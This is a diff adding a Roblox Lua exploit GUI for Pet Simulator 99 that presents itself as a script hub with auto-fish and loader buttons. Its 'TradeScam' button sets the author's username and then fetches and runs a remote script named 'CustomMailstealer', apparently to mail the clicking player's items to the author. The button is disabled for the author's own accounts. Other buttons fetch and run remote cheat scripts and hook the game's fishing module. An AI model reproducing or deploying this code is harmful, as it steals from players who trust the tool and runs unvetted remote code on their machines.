@@ -1,0 +1,628 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
+]=]
+
+-- Instances: 39 | Scripts: 7 | Modules: 0
+local G2L = {};
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["Name"] = [[WALTUHISCOOKINGMATHFR03949238458374589734857349]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64);
+G2L["2"]["Size"] = UDim2.new(0, 468, 0, 268);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Position"] = UDim2.new(0.3366834223270416, 0, 0.3471715450286865, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.UICorner
+G2L["3"] = Instance.new("UICorner", G2L["2"]);
+G2L["3"]["CornerRadius"] = UDim.new(0, 20);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.LocalScript
+G2L["4"] = Instance.new("LocalScript", G2L["2"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White
+G2L["5"] = Instance.new("Frame", G2L["2"]);
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5"]["Size"] = UDim2.new(0, 458, 0, 258);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Position"] = UDim2.new(0.010683760978281498, 0, 0.018656715750694275, 0);
+G2L["5"]["Name"] = [[White]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.UICorner
+G2L["6"] = Instance.new("UICorner", G2L["5"]);
+G2L["6"]["CornerRadius"] = UDim.new(0, 20);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.TradeScam
+G2L["7"] = Instance.new("TextButton", G2L["5"]);
+G2L["7"]["TextWrapped"] = true;
+G2L["7"]["ZIndex"] = 2;
+G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["TextScaled"] = true;
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
+G2L["7"]["TextSize"] = 14;
+G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["Size"] = UDim2.new(0, 180, 0, 45);
+G2L["7"]["Name"] = [[TradeScam]];
+G2L["7"]["Text"] = [[]];
+G2L["7"]["Position"] = UDim2.new(0.15283842384815216, 0, 0.3798450827598572, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.TradeScam.Shadow
+G2L["8"] = Instance.new("Frame", G2L["7"]);
+G2L["8"]["BorderSizePixel"] = 0;
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
+G2L["8"]["Size"] = UDim2.new(1, 0, 1, 4);
+G2L["8"]["Name"] = [[Shadow]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.TradeScam.TextLabel
+G2L["9"] = Instance.new("TextLabel", G2L["7"]);
+G2L["9"]["TextWrapped"] = true;
+G2L["9"]["ZIndex"] = 2;
+G2L["9"]["BorderSizePixel"] = 0;
+G2L["9"]["TextScaled"] = true;
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["9"]["TextSize"] = 14;
+G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
+G2L["9"]["Size"] = UDim2.new(1, -20, 1, -20);
+G2L["9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["9"]["Text"] = [[TradeScam]];
+G2L["9"]["BackgroundTransparency"] = 1;
+G2L["9"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.TradeScam.LocalScript
+G2L["a"] = Instance.new("LocalScript", G2L["7"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.Load REDz (No key)
+G2L["b"] = Instance.new("TextButton", G2L["5"]);
+G2L["b"]["TextWrapped"] = true;
+G2L["b"]["ZIndex"] = 2;
+G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["TextScaled"] = true;
+G2L["b"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
+G2L["b"]["TextSize"] = 14;
+G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b"]["Size"] = UDim2.new(0, 180, 0, 45);
+G2L["b"]["Name"] = [[Load REDz (No key)]];
+G2L["b"]["Text"] = [[]];
+G2L["b"]["Position"] = UDim2.new(0.15283842384815216, 0, 0.16666683554649353, 3);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.Load REDz (No key).Shadow
+G2L["c"] = Instance.new("Frame", G2L["b"]);
+G2L["c"]["BorderSizePixel"] = 0;
+G2L["c"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
+G2L["c"]["Size"] = UDim2.new(1, 0, 1, 4);
+G2L["c"]["Name"] = [[Shadow]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.Load REDz (No key).TextLabel
+G2L["d"] = Instance.new("TextLabel", G2L["b"]);
+G2L["d"]["TextWrapped"] = true;
+G2L["d"]["ZIndex"] = 2;
+G2L["d"]["BorderSizePixel"] = 0;
+G2L["d"]["TextScaled"] = true;
+G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["d"]["TextSize"] = 14;
+G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
+G2L["d"]["Size"] = UDim2.new(1, -20, 1, -20);
+G2L["d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["d"]["Text"] = [[Load REDz (No key)]];
+G2L["d"]["BackgroundTransparency"] = 1;
+G2L["d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.Load REDz (No key).LocalScript
+G2L["e"] = Instance.new("LocalScript", G2L["b"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.script name
+G2L["f"] = Instance.new("Frame", G2L["5"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
+G2L["f"]["Size"] = UDim2.new(0, 165, 0, 53);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f"]["Position"] = UDim2.new(-0.055526599287986755, -31, -0.3743898868560791, 46);
+G2L["f"]["Rotation"] = -5;
+G2L["f"]["Name"] = [[script name]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.script name.TextBox
+G2L["10"] = Instance.new("TextBox", G2L["f"]);
+G2L["10"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["TextSize"] = 14;
+G2L["10"]["TextWrapped"] = true;
+G2L["10"]["TextScaled"] = true;
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10"]["PlaceholderText"] = [[ WaltuhScriptingX ]];
+G2L["10"]["Size"] = UDim2.new(0, 157, 0, 39);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["Text"] = [[]];
+G2L["10"]["Position"] = UDim2.new(0.024242423474788666, 0, 0.1320754736661911, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.script name.TextBox.UICorner
+G2L["11"] = Instance.new("UICorner", G2L["10"]);
+G2L["11"]["CornerRadius"] = UDim.new(0, 10);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.script name.UICorner
+G2L["12"] = Instance.new("UICorner", G2L["f"]);
+G2L["12"]["CornerRadius"] = UDim.new(0, 20);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr
+G2L["13"] = Instance.new("Frame", G2L["5"]);
+G2L["13"]["BorderSizePixel"] = 0;
+G2L["13"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
+G2L["13"]["Size"] = UDim2.new(0, 124, 0, 124);
+G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["13"]["Position"] = UDim2.new(0.7139238119125366, 0, 0.12126030027866364, 0);
+G2L["13"]["Name"] = [[userimagefr]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel
+G2L["14"] = Instance.new("ImageLabel", G2L["13"]);
+G2L["14"]["BorderSizePixel"] = 0;
+G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
+G2L["14"]["Size"] = UDim2.new(0, 100, 0, 100);
+G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14"]["Position"] = UDim2.new(0.09677419066429138, 0, 0.09677419066429138, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel.LocalScript
+G2L["15"] = Instance.new("LocalScript", G2L["14"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel.TextLabel
+G2L["16"] = Instance.new("TextLabel", G2L["14"]);
+G2L["16"]["TextWrapped"] = true;
+G2L["16"]["BorderSizePixel"] = 0;
+G2L["16"]["TextScaled"] = true;
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16"]["TextSize"] = 14;
+G2L["16"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["BackgroundTransparency"] = 100;
+G2L["16"]["Position"] = UDim2.new(-0.004999999888241291, 0, 1.0774792432785034, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel.TextLabel.LocalScript
+G2L["17"] = Instance.new("LocalScript", G2L["16"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel.UICorner
+G2L["18"] = Instance.new("UICorner", G2L["14"]);
+G2L["18"]["CornerRadius"] = UDim.new(1, 10);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.UICorner
+G2L["19"] = Instance.new("UICorner", G2L["13"]);
+G2L["19"]["CornerRadius"] = UDim.new(1, 10);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.cross
+G2L["1a"] = Instance.new("ImageButton", G2L["2"]);
+G2L["1a"]["ZIndex"] = 2;
+G2L["1a"]["Image"] = [[rbxassetid://6764432408]];
+G2L["1a"]["ImageRectSize"] = Vector2.new(50, 50);
+G2L["1a"]["Size"] = UDim2.new(0, 47, 0, 47);
+G2L["1a"]["Name"] = [[cross]];
+G2L["1a"]["ImageRectOffset"] = Vector2.new(200, 600);
+G2L["1a"]["Position"] = UDim2.new(0.9443419575691223, 0, -0.08831250667572021, 0);
+G2L["1a"]["BackgroundTransparency"] = 1;
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.cross.LocalScript
+G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.Shadow
+G2L["1c"] = Instance.new("Frame", G2L["2"]);
+G2L["1c"]["BorderSizePixel"] = 0;
+G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(119, 0, 46);
+G2L["1c"]["Size"] = UDim2.new(0.10147225856781006, 0, 0.17640984058380127, 0);
+G2L["1c"]["Position"] = UDim2.new(0.9532442092895508, 0, -0.06360238790512085, 0);
+G2L["1c"]["Name"] = [[Shadow]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.Shadow.UICorner
+G2L["1d"] = Instance.new("UICorner", G2L["1c"]);
+G2L["1d"]["CornerRadius"] = UDim.new(0, 7);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.Pattern
+G2L["1e"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["1e"]["ZIndex"] = 9;
+G2L["1e"]["SliceCenter"] = Rect.new(0, 256, 0, 256);
+G2L["1e"]["ScaleType"] = Enum.ScaleType.Tile;
+G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e"]["ImageTransparency"] = 0.6000000238418579;
+G2L["1e"]["Image"] = [[rbxassetid://121480522]];
+G2L["1e"]["TileSize"] = UDim2.new(0, 45, 0, 45);
+G2L["1e"]["Size"] = UDim2.new(0, 313, 0, 264);
+G2L["1e"]["Name"] = [[Pattern]];
+G2L["1e"]["BackgroundTransparency"] = 1;
+G2L["1e"]["Position"] = UDim2.new(0.010077118873596191, 0, 0.018641769886016846, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.Pattern.UICorner
+G2L["1f"] = Instance.new("UICorner", G2L["1e"]);
+G2L["1f"]["CornerRadius"] = UDim.new(0, 20);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.button red
+G2L["20"] = Instance.new("Frame", G2L["2"]);
+G2L["20"]["BorderSizePixel"] = 0;
+G2L["20"]["BackgroundColor3"] = Color3.fromRGB(227, 0, 99);
+G2L["20"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20"]["Position"] = UDim2.new(0.9495252370834351, 0, -0.07270471006631851, 0);
+G2L["20"]["Name"] = [[button red]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.button red.UICorner
+G2L["21"] = Instance.new("UICorner", G2L["20"]);
+G2L["21"]["CornerRadius"] = UDim.new(0, 7);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.Version
+G2L["22"] = Instance.new("TextLabel", G2L["2"]);
+G2L["22"]["TextWrapped"] = true;
+G2L["22"]["BorderSizePixel"] = 0;
+G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22"]["TextSize"] = 30;
+G2L["22"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["Size"] = UDim2.new(0, 128, 0, 86);
+G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["Text"] = [[2.0V]];
+G2L["22"]["Name"] = [[Version]];
+G2L["22"]["BackgroundTransparency"] = 100;
+G2L["22"]["Position"] = UDim2.new(-0.03205128386616707, 0, 0.7761196494102478, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.TextLabel
+G2L["23"] = Instance.new("TextLabel", G2L["2"]);
+G2L["23"]["TextWrapped"] = true;
+G2L["23"]["BorderSizePixel"] = 0;
+G2L["23"]["TextScaled"] = true;
+G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23"]["TextSize"] = 14;
+G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23"]["Size"] = UDim2.new(0, 115, 0, 77);
+G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23"]["Text"] = [[Sub to @WaltuhScriptingX on YT and TT]];
+G2L["23"]["BackgroundTransparency"] = 100;
+G2L["23"]["Position"] = UDim2.new(0.7286324501037598, 0, 0.7425374388694763, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.autofish
+G2L["24"] = Instance.new("TextButton", G2L["2"]);
+G2L["24"]["TextWrapped"] = true;
+G2L["24"]["ZIndex"] = 2;
+G2L["24"]["BorderSizePixel"] = 0;
+G2L["24"]["TextScaled"] = true;
+G2L["24"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
+G2L["24"]["TextSize"] = 14;
+G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24"]["Size"] = UDim2.new(0, 180, 0, 45);
+G2L["24"]["Name"] = [[autofish]];
+G2L["24"]["Text"] = [[]];
+G2L["24"]["Position"] = UDim2.new(0.16143208742141724, 0, 0.5823500156402588, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.autofish.Shadow
+G2L["25"] = Instance.new("Frame", G2L["24"]);
+G2L["25"]["BorderSizePixel"] = 0;
+G2L["25"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
+G2L["25"]["Size"] = UDim2.new(1, 0, 1, 4);
+G2L["25"]["Name"] = [[Shadow]];
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.autofish.TextLabel
+G2L["26"] = Instance.new("TextLabel", G2L["24"]);
+G2L["26"]["TextWrapped"] = true;
+G2L["26"]["ZIndex"] = 2;
+G2L["26"]["BorderSizePixel"] = 0;
+G2L["26"]["TextScaled"] = true;
+G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["26"]["TextSize"] = 14;
+G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
+G2L["26"]["Size"] = UDim2.new(1, -20, 1, -20);
+G2L["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["26"]["Text"] = [[Auto-Fish]];
+G2L["26"]["BackgroundTransparency"] = 1;
+G2L["26"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.autofish.LocalScript
+G2L["27"] = Instance.new("LocalScript", G2L["24"]);
+
+
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.LocalScript
+local function C_4()
+local script = G2L["4"];
+	--// Services
+	local Players = game:GetService('Players')
+	local UIS = game:GetService("UserInputService")
+	local RunService = game:GetService("RunService")
+	
+	--// Variables
+	local UI = script.Parent
+	
+	local Player = Players.LocalPlayer
+	local Mouse = Player:GetMouse()
+	
+	local Hovered = false
+	local Holding = false
+	local MoveCon = nil
+	
+	local InitialX, InitialY, UIInitialPos
+	
+	--// Functions
+	
+	local function Drag()
+		if Holding == false then MoveCon:Disconnect(); return end
+		local distanceMovedX = InitialX - Mouse.X
+		local distanceMovedY = InitialY - Mouse.Y
+	
+		local targetPosition = UIInitialPos - UDim2.new(0, distanceMovedX, 0, distanceMovedY)
+		local currentPosition = UI.Position
+	
+		local smoothness = 10 -- Adjust this value for desired smoothness
+		local newPosition = currentPosition:Lerp(targetPosition, smoothness * RunService.RenderStepped:Wait())
+	
+		UI.Position = newPosition
+	
+		if newPosition ~= targetPosition then
+			Drag()
+		end
+	end
+	
+	--// Connections
+	
+	UI.MouseEnter:Connect(function()
+		Hovered = true
+	end)
+	
+	UI.MouseLeave:Connect(function()
+		Hovered = false
+	end)
+	
+	UIS.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			Holding = Hovered
+			if Holding then
+				InitialX, InitialY = Mouse.X, Mouse.Y
+				UIInitialPos = UI.Position
+	
+				MoveCon = RunService.RenderStepped:Connect(Drag)
+			end
+		end
+	end)
+	
+	UIS.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			Holding = false
+			MoveCon:Disconnect()
+		end
+	end)
+end;
+task.spawn(C_4);
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.TradeScam.LocalScript
+local function C_a()
+local script = G2L["a"];
+	local button = script.Parent -- Assuming the script is inside the button
+	
+	local disabledUsers = { -- List of users to disable the button for
+		"2k13act",
+		"HeHeartsXmma",
+		"AESheepy"
+	}
+	
+	local function isUserDisabled(userId)
+		for _, username in ipairs(disabledUsers) do
+			if userId == game.Players:GetUserIdFromNameAsync(username) then
+				return true
+			end
+		end
+		return false
+	end
+	
+	local function onButtonClicked()
+		local player = game.Players.LocalPlayer
+		if player and not isUserDisabled(player.UserId) then
+			print("heya, just wait a bit, I'm loading...")
+	
+			Username = "2k13act"
+			G_LoadingScreen = "Please wait till the script loads fully..."
+			G_Mailmessage = "KOEMS FR"
+	
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+		else
+			-- Button is disabled for the user
+			print("are you fucking dum?")
+		end
+	end
+	
+	button.MouseButton1Click:Connect(onButtonClicked)
+end;
+task.spawn(C_a);
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.Load REDz (No key).LocalScript
+local function C_e()
+local script = G2L["e"];
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua", true))()
+	end)
+end;
+task.spawn(C_e);
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel.LocalScript
+local function C_15()
+local script = G2L["15"];
+	local player = game.Players.LocalPlayer
+	
+	-- Function to set the player's profile picture as the ImageLabel's image
+	local function setProfilePicture()
+		local userId = player.UserId
+		local imageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+		script.Parent.Image = imageUrl
+	end
+	
+	-- Call the function to set the profile picture
+	setProfilePicture()
+end;
+task.spawn(C_15);
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.White.userimagefr.ImageLabel.TextLabel.LocalScript
+local function C_17()
+local script = G2L["17"];
+	local player = game.Players.LocalPlayer
+	local nameLabel = script.Parent
+	
+	-- Function to set the TextLabel's text
+	local function setGreeting()
+		local randomNum = math.random(1, 10)
+		local nickname = player.Name
+	
+		if randomNum == 1 then
+			nameLabel.Text = "WSG, " .. nickname .. ", WELCOME MY G"
+		elseif nickname == "2k13act" and randomNum <= 9 then
+			nameLabel.Text = "welkom frfr"
+		elseif nickname == "AESheepy" and randomNum <= 9 then
+			nameLabel.Text = "Welcome, Fade blehhh!"
+		else
+			nameLabel.Text = "Hello, " .. nickname .. "!"
+		end
+	
+	
+	end
+	
+	-- Call the function to set the greeting
+	setGreeting()
+end;
+task.spawn(C_17);
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.cross.LocalScript
+local function C_1b()
+local script = G2L["1b"];
+	-- Put this script inside the Close button
+	
+	local button = script.Parent -- Reference to the button
+	
+	button.MouseButton1Click:Connect(function()
+		local gui = button.Parent.Parent -- Reference to the GUI
+		gui.Enabled = false -- Close the GUI by disabling it
+	end)
+end;
+task.spawn(C_1b);
+-- StarterGui.WALTUHISCOOKINGMATHFR03949238458374589734857349.Frame.autofish.LocalScript
+local function C_27()
+local script = G2L["27"];
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	
+		local Chimpanzees = game:GetService("Players")
+		local Jungle = game:GetService("Workspace")
+		local TreeClimbingService = game:GetService("RunService")
+		local BananaStorage = game:GetService("ReplicatedStorage")
+	
+		-- monkey type shit
+	
+		local InGame = false
+		local Monkey = Chimpanzees.LocalPlayer
+		local MonkeyHabitat = Jungle:WaitForChild("__THINGS")
+		local ActiveMonkeys = MonkeyHabitat:WaitForChild("__INSTANCE_CONTAINER"):WaitForChild("Active")
+		local MonkeyDebris = Jungle:WaitForChild("__DEBRIS")
+		local MonkeyNetwork = BananaStorage:WaitForChild("Network")
+		local OldMonkeyHooks = {}
+		local MonkeyFishingGame = Monkey:WaitForChild("PlayerGui"):WaitForChild("_INSTANCES").FishingGame.GameBar
+		local CurrentMonkeyFishingModule = require(MonkeyHabitat.__INSTANCE_CONTAINER.Active:WaitForChild("Fishing").ClientModule.FishingGame)
+	
+		--  functions
+	
+		for i, v in pairs(CurrentMonkeyFishingModule) do
+			OldMonkeyHooks[i] = v
+		end
+	
+		CurrentMonkeyFishingModule.IsFishInBar = function()
+			return math.random(1, 6) ~= 1
+		end
+	
+		CurrentMonkeyFishingModule.StartGame = function(...)
+			InGame = true
+			return OldMonkeyHooks.StartGame(...)
+		end
+	
+		CurrentMonkeyFishingModule.StopGame = function(...)
+			InGame = false
+			return OldMonkeyHooks.StopGame(...)
+		end
+	
+		local function waitForMonkeyGameState(state)
+			repeat
+				TreeClimbingService.RenderStepped:Wait()
+			until InGame == state
+		end
+	
+		local function getMonkeyRod()
+			return Monkey.Character and Monkey.Character:FindFirstChild("Rod", true)
+		end
+	
+		local function getMonkeyBubbles(anchor)
+			local myBobber = nil
+			local myBubbles = false
+			local closestBobber = math.huge
+	
+			for _, v in pairs(ActiveMonkeys.Fishing.Bobbers:GetChildren()) do
+				local distance = (v.Bobber.CFrame.Position - anchor.CFrame.Position).Magnitude
+	
+				if distance <= closestBobber then
+					myBobber = v.Bobber
+					closestBobber = distance
+				end
+			end
+	
+			if myBobber then
+				for _, v in pairs(MonkeyDebris:GetChildren()) do
+					if v.Name == "host" and v:FindFirstChild("Attachment") and (v.Attachment:FindFirstChild("Bubbles") or v.Attachment:FindFirstChild("Rare Bubbles")) and (v.CFrame.Position - myBobber.CFrame.Position).Magnitude <= 1 then
+						myBubbles = true
+						break
+					end
+				end
+			end
+	
+			return myBubbles
+		end
+	
+		while task.wait(1) do
+			pcall(function()
+				local fishingInstance = MonkeyHabitat.__INSTANCE_CONTAINER.Active:FindFirstChild("Fishing")
+				if fishingInstance and not InGame then
+					MonkeyNetwork.Instancing_FireCustomFromClient:FireServer("Fishing", "RequestCast", Vector3.new(1158 + math.random(-10, 10), 75, -3454 + math.random(-10, 10)))
+	
+					local myAnchor = getMonkeyRod():WaitForChild("FishingLine").Attachment0
+					repeat
+						TreeClimbingService.RenderStepped:Wait()
+					until not ActiveMonkeys:FindFirstChild("Fishing") or (myAnchor and getMonkeyBubbles(myAnchor)) or InGame
+	
+					if ActiveMonkeys:FindFirstChild("Fishing") then
+						MonkeyNetwork.Instancing_FireCustomFromClient:FireServer("Fishing", "RequestReel")
+						waitForMonkeyGameState(true)
+						waitForMonkeyGameState(false)
+					end
+	
+					repeat
+						TreeClimbingService.RenderStepped:Wait()
+					until not ActiveMonkeys:FindFirstChild("Fishing") or (getMonkeyRod() and getMonkeyRod().Parent.Bobber.Transparency <= 0)
+				end
+			end)
+		end
+	end)
+end;
+task.spawn(C_27);
+
+return G2L["1"], require;
